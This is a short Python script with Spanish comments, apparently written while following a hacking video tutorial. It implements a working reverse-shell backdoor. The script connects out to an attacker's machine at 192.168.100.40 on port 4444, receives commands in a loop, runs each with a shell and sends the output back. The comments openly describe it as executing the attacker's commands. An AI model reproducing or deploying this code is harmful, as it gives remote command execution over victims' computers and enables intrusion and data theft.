#continuar luego
#https://youtu.be/G0Bb0lvAspo?t=2231
import socket
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Define la variable connection
        self.connection.connect((ip, port)) #Hace la conexión al servidor del atacante

    def ejecutar_comando(self, command): #Ejecuta el comando que envia el atacante
        return subprocess.check_output(command, shell=True) #Ejecuta el comando que envia el atacante
    
    def run(self):
        while True:
            command=self.connection.recv(1024) #Obtiene el comando escrito por el atacante
            resultados_comando = self.ejecutar_comando(command) #Se guardan lso resultados obtenidos
            self.connection.send(resultados_comando) #Envia lo obtenido en pantalla al ejecutar el comando del atacante
        connection.close() #Se cierra la conexion
        
puerta  = Backdoor("192.168.100.40", 4444) #Direccion ip del servidor a donde van los datos
puerta.run()